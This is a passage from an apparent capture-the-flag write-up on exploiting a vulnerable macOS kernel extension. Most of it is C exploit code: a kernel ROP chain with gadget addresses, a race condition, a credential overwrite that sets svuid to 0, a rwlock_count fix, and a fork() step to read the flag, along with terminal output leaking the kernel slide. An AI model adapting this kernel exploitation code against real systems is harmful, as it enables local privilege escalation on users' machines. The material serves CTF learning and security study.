</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// pmap_ro_zone_atomic_op(ZONE_ID_KAUTH_CRED, proc_ucred(current_proc()), 0x20, ZRO_ATOMIC_AND_32, 0);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// , which will update the cred-&gt;cr_svuid
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">current_proc</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">pop_rcx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">proc_ucred</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">mov_rdi_rax_pop_rbp_jmp_rcx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="mh">0x4141414141414141</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// We will continue the ROP Chain at 0x80 just for convenience
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// Need to do this because:
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// - rsi points to chunk+0x10
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// - there will be jmp qword ptr [rsi+0x66], which mean we need to put
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">//   gadget in chunk+0x76 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// So what we do here is we reserve 0x10 bytes starting from chunk+0x70
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">pop_r14_r15</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="mh">0x4141414141414141</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="mh">0x4141414141414141</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// Overwrite chunk+0x76 to pivot stack gadget
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">uint64_t</span><span class="o">*</span> <span class="n">chunk_0x76</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">ropChain</span><span class="p">[</span><span class="mh">0x76</span> <span class="o">-</span> <span class="mi">8</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">chunk_0x76</span> <span class="o">=</span> <span class="n">pop_rsp_r13_r14_r15</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// Continue ROPChain
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// // Debugging purposes
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// *chain++ = pop_rcx;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// *chain++ = addr_save_loc;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// *chain++ = mov_qword_rcx_rax_pop_rbp;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// *chain++ = 0x4141414141414141;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  
</span></span><span class="line"><span class="cl">  <span class="c1">// rax still contains the ucred (returned from proc_ucred)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// Set rsi to ucred
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">mov_rsi_rax_spoil_rax_pop_rbp_ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="mh">0x4141414141414141</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// Set rdi
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">pop_rdi</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="mi">7</span><span class="p">;</span>   <span class="c1">// ZONE_ID_KAUTH_CRED
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="c1">// Set rdx
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">pop_rdx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="mh">0x20</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// Set rcx
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">pop_rcx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="mh">0x34</span><span class="p">;</span>    <span class="c1">// ZRO_ATOMIC_AND_32
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="c1">// Set r8
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">pop_r8_eax_spoil</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="c1">// Call pmap_ro_zone_atomic_op
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">pmap_ro_zone_atomic_op</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="c1">// Return to userland
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">thread_exception_return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// Store ROPChain in heap chunk
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// &amp;ropChain[0x8] because ropChain is used by leave_message(0) as well, which
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// write starting from chunk+0x8. And leave_message(1) write starting from chunk+0x10,
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// so, to make the stored ROPChain consistent, we need to send input+0x8 for leave_message(1)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">leave_message</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ropChain</span><span class="p">[</span><span class="mh">0x8</span><span class="p">],</span> <span class="mh">0x200</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">    Trigger Race Condition:
</span></span></span><span class="line"><span class="cl"><span class="cm">    - Create a new thread which will call leave_message(0, ropChain, 0x100);
</span></span></span><span class="line"><span class="cl"><span class="cm">    - In the mainthread, keep calling leave_message(1, ropChain+0x8, 0x200);
</span></span></span><span class="line"><span class="cl"><span class="cm">    - Race is success if:
</span></span></span><span class="line"><span class="cl"><span class="cm">      - chunk+0x98 is set to 1
</span></span></span><span class="line"><span class="cl"><span class="cm">      - yet, the chunk+0x8 is not output2, but the gadget that we write via leave_message(0) in the other thread
</span></span></span><span class="line"><span class="cl"><span class="cm">  */</span>
</span></span><span class="line"><span class="cl">  <span class="kt">pthread_t</span> <span class="n">th</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">th</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">race</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">test</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="nf">memset</span><span class="p">(</span><span class="n">test</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">test</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">loop_end</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">leave_message</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ropChain</span><span class="p">[</span><span class="mh">0x8</span><span class="p">],</span> <span class="mh">0x200</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">baby_read</span><span class="p">(</span><span class="n">test</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s try to run this code.</p>
<img src="https://i.imgur.com/TdprDBU.png"/>
<p>This code was still crashing. We can inspect what caused the crash by clicking <code>Report</code> to Apple. Below is the error that caused the panic.</p>
<img src="https://i.imgur.com/bewnJhv.png"/>
<p>We couldn&rsquo;t return to userland because the <code>current_thread()-&gt;rwlock_count</code> isn&rsquo;t 0, so we just need to overwrite this to 0 by updating our ROP Chain just before calling the <code>thread_exception_return</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// Call pmap_ro_zone_atomic_op
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">pmap_ro_zone_atomic_op</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// Overwrite rwlock_count to 0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">current_thread</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">mov_rsi_rax_spoil_rax_pop_rbp_ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="mh">0x4141414141414141</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">pop_rcx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="mh">0x44C</span><span class="p">;</span> <span class="c1">// offset for rwlock_count
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">add_rsi_rcx_mov_rax_rsi_pop_rbp</span><span class="p">;</span> <span class="c1">// Points rsi to rwlock_count
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="mh">0x4141414141414141</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">pop_r8_eax_spoil</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">mov_dword_ptr_rsi_r8d_pop_rbp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="mh">0x4141414141414141</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="c1">// Return to userland
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">thread_exception_return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now that we&rsquo;ve updated the ROP Chain, let&rsquo;s try to compile and run the updated code again.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">chovid99@Chovid99s-iMac-Pro ~ % ./exploit
</span></span><span class="line"><span class="cl">[*] Kext Base       : 0xffffff7fa9fa4000
</span></span><span class="line"><span class="cl">[*] Kernel Text Base: 0xffffff8012fdc000
</span></span><span class="line"><span class="cl">[*] Kernel Slide    : 0x12edc000
</span></span><span class="line"><span class="cl">zsh: killed     ./exploit
</span></span><span class="line"><span class="cl">chovid99@Chovid99s-iMac-Pro ~ % 
</span></span></code></pre></td></tr></table>
</div>
</div><p>It isn&rsquo;t crashing, but it killed the process just after we return to the userland. To overcome this, my teammate sampriti told me that we can actually use a <code>fork()</code> start in the beginning, so that the <code>parent</code> and <code>child</code> will have shared credentials. Using his idea, we can tweak the exploit by:</p>
<ul>
<li>Calling <code>fork()</code> in the beginning of our exploit.
<ul>
<li>Child process do the exploit above, so that it will overwrite the shared credentials <code>svuid</code> to 0.</li>
<li>Parent process <code>sleep()</code> first, with hope that after the <code>sleep</code> is finished, the <code>child</code> process (which is <code>killed</code>) already overwrite the shared <code>cred-&gt;svuid</code> to 0, so that parent process can read the flag in <code>/flag</code> directory.</li>
</ul>
</li>
</ul>
<p>Below is the final code that works smoothly:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span><span class="lnt">232
</span><span class="lnt">233
</span><span class="lnt">234
</span><span class="lnt">235
</span><span class="lnt">236
</span><span class="lnt">237
</span><span class="lnt">238
</span><span class="lnt">239
</span><span class="lnt">240
</span><span class="lnt">241
</span><span class="lnt">242
</span><span class="lnt">243
</span><span class="lnt">244
</span><span class="lnt">245
</span><span class="lnt">246
</span><span class="lnt">247
</span><span class="lnt">248
</span><span class="lnt">249
</span><span class="lnt">250
</span><span class="lnt">251
</span><span class="lnt">252
</span><span class="lnt">253
</span><span class="lnt">254
</span><span class="lnt">255
</span><span class="lnt">256
</span><span class="lnt">257
</span><span class="lnt">258
</span><span class="lnt">259
</span><span class="lnt">260
</span><span class="lnt">261
</span><span class="lnt">262
</span><span class="lnt">263
</span><span class="lnt">264
</span><span class="lnt">265
</span><span class="lnt">266
</span><span class="lnt">267
</span><span class="lnt">268
</span><span class="lnt">269
</span><span class="lnt">270
</span><span class="lnt">271
</span><span class="lnt">272
</span><span class="lnt">273
</span><span class="lnt">274
</span><span class="lnt">275
</span><span class="lnt">276
</span><span class="lnt">277
</span><span class="lnt">278
</span><span class="lnt">279
</span><span class="lnt">280
</span><span class="lnt">281
</span><span class="lnt">282
</span><span class="lnt">283
</span><span class="lnt">284
</span><span class="lnt">285
</span><span class="lnt">286
</span><span class="lnt">287
</span><span class="lnt">288
</span><span class="lnt">289
</span><span class="lnt">290
</span><span class="lnt">291
</span><span class="lnt">292
</span><span class="lnt">293
</span><span class="lnt">294
</span><span class="lnt">295
</span><span class="lnt">296
</span><span class="lnt">297
</span><span class="lnt">298
</span><span class="lnt">299
</span><span class="lnt">300
</span><span class="lnt">301
</span><span class="lnt">302
</span><span class="lnt">303
</span><span class="lnt">304
</span><span class="lnt">305
</span><span class="lnt">306
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/ioctl.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;pthread.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sched.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;IOKit/IOKitLib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;CoreFoundation/CoreFoundation.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;mach/mach.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#define kBabyRead 	    0
</span></span></span><span class="line"><span class="cl"><span class="cp">#define kLeaveMessage 	1
</span></span></span><span class="line"><span class="cl"><span class="cp">#define kIOKitClassName &#34;BabyKitDriver&#34;
</span></span></span><span class="line"><span class="cl"><span class="cp">#define KERNEL_BASE_NO_SLID 0xFFFFFF8000100000ULL
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">uint64_t</span> <span class="n">kbase</span><span class="p">,</span> <span class="n">slide</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">io_connect_t</span> <span class="n">connection</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="n">ropChain</span><span class="p">[</span><span class="mh">0x200</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">loop_end</span> <span class="o">=</span> <span class="mi">100000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Gadgets
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define push_rcx_jmp_qword_ptr_rsi_plus_0x66 slide+0xffffff8000a984e1 </span><span class="c1">// push rcx ; out dx, eax ; jmp qword ptr [rsi + 0x66]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define pop_rcx slide+0xffffff800034fb88
</span></span></span><span class="line"><span class="cl"><span class="cp">#define mov_rdi_rax_pop_rbp_jmp_rcx slide+0xffffff8000364001
</span></span></span><span class="line"><span class="cl"><span class="cp">#define ret slide+0xffffff8000335311
</span></span></span><span class="line"><span class="cl"><span class="cp">#define pop_r14_r15 slide+0xffffff8000352176
</span></span></span><span class="line"><span class="cl"><span class="cp">#define pop_rsp_r13_r14_r15 slide+0xffffff8000352173
</span></span></span><span class="line"><span class="cl"><span class="cp">#define mov_qword_rcx_rax_pop_rbp slide+0xffffff800037a86e </span><span class="c1">// mov qword ptr [rcx], rax ; pop rbp ; ret
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define mov_rsi_rax_spoil_rax_pop_rbp_ret 0xffffff8000536392+slide  </span><span class="c1">// mov rsi, rax ; sub rax, rsi ; pop rbp ; ret
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define pop_rdi 0xFFFFFF8000334E74+slide
</span></span></span><span class="line"><span class="cl"><span class="cp">#define pop_rdx 0xFFFFFF80006FF654+slide
</span></span></span><span class="line"><span class="cl"><span class="cp">#define pop_r8_eax_spoil 0xffffff80004db621+slide  </span><span class="c1">// pop r8 ; add eax, 0x5d000000 ; ret
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define add_rsi_rcx_mov_rax_rsi_pop_rbp 0xffffff80009ce25d+slide </span><span class="c1">// 0xffffff80009ce25d : add rsi, rcx ; mov rax, rsi ; pop rbp ; ret
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define mov_dword_ptr_rsi_r8d_pop_rbp 0xffffff8000474e08+slide</span><span class="c1">// 0xffffff8000474e08 : mov dword ptr [rsi], r8d ; pop rbp ; ret
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// Existing kernel functions
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define current_thread slide+0xFFFFFF80004D1ED0
</span></span></span><span class="line"><span class="cl"><span class="cp">#define current_proc slide+0xFFFFFF8000989860
